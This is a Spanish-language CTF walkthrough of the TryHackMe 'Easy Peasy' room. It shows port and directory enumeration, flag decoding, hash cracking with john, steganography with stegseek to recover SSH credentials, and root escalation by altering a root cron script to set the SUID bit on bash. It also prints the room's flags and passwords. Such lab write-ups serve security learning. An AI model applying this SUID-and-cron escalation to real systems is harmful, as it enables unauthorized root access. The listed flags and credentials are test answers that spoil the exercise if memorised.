# Easy Peasy - TryHackMe

## Reconocimiento

Vamos a realizar un escaneo de puertos con **Nmap** para identificar los servicios que se están ejecutando en la máquina objetivo

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.130.181.196 -oG allPorts

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 62
6498/tcp  open  unknown syn-ack ttl 62
65524/tcp open  unknown syn-ack ttl 62
```

Veamos las versiones de los servicios que se están ejecutando en los puertos abiertos

```bash
nmap -sCV -p80,6498,65524 10.130.179.195

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
[65524](http://10.130.179.195/robots.txt)/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
```

Vemos que en el puerto 80 se está ejecutando un servidor web **nginx** y en el puerto 65524 se está ejecutando un servidor web **Apache**.
Además, en el puerto 6498 se está ejecutando un servicio **SSH**.

Al entrar a http://10.130.179.195/ vemos un sitio en nginx por defecto.

En http://10.130.179.195:65524/ vemos un sitio en Apache por defecto.

Vamos a realizarles escaneos con gobuster para ver si encontramos algún directorio o archivo interesante.

```bash
gobuster dir -u http://10.130.179.195 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 -x txt,js,php,xml,bak

/robots.txt           (Status: 200) [Size: 43]
/hidden               (Status: 301) [Size: 169] [--> http://10.130.179.195/hidden/]
```

En robots.txt encontramos vemos esto:

```
User-Agent:*
Disallow:/
Robots Not Allowed
```

En /hidden/ encontramos esto:

![alt text](image.png)

En http://10.130.179.195:65524/robots.txt encontramos esto
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

Al decodificar el User-Agent vemos que es un hash MD5, a18672860d0510e5ab6699730763b250 se convierte en la flag.

Seguimos enumerando y en el código fuente de http://10.130.179.195/hidden/whatever/ vemos:

ZmxhZ3tmMXJzN19mbDRnfQ==

Al decodificar el texto en base64 obtenemos otra flag: flag{f1rs7_fl4g}

Hagamos ahora un escaneo con gubuster pero con el user-agent que encontramos en el robots.txt del puerto 65524.

En el codigo fuente de la página apache por defecto encontramos otra flag y además este mensaje:
its encoded with ba....: ObsJmP173N2X6dOrAgEAL0Vu que decodificandolo en base62 la flag nos lleva a un directorio /n0th1ng3ls3m4tt3r.

940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

Esto es un hash que debemos crackear para obtener la flag conel diccionario que nos dan:

```bash
john --wordlist=dic.txt --format=gost hash

123456..sunshine
```

Probamos con gost porque john nos decía que podian ser distintas como Panama, Raw-SHA256, GOST, etc. 

En la propia página http://10.130.179.195:65524/n0th1ng3ls3m4tt3r/ vemos una imagen connumeros en binario `10011010010000001010`

Al realizar esteganografía con steghide:

```bash
stegseek binarycodepixabay.jpg dic.txt

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

La traducción es: iconvertedmypasswordtobinary

Entramos por ssh con el usuario boring y la contraseña iconvertedmypasswordtobinary y obtenemos la flag de usuario que esta rotada con rot13: synt{a0jvgf33zfa0ez4y}

Ahora el ctf nos dice que hay una tarea cron, vamos a verla.

```bash
cat /etc/crontab

* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh

cat .mysecretcronjob.sh
#!/bin/bash
# i will run as root
```

Vamos a modificar el script para que nos de una bash con privilegios de root.

```bash
chmod u+s bash
```

```bash
boring@kral4-PC:/bin$ bash -p
bash-4.4# whoami
root
```

Vamos a /root y vemos que hay un archivo llamado .root.txt, lo abrimos y vemos la flag de root.